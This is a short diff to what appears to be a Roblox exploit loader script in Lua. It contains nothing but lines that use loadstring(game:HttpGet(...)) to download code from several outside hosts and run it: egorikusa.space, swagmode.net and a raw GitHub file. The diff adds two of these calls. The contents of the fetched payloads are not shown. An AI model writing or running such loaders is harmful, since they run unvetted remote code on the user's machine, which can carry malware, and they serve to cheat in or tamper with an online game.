@@ -6,3 +6,11 @@
 
 
 loadstring(game:HttpGet("https://egorikusa.space/6ea7bfdaef07489be9e7a60f.lua", true))()
+
+do
+loadstring(game:HttpGet('https://swagmode.net/execute'))()
+wait(2)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/yuvic123/s/main/s'))()
+
+
+end
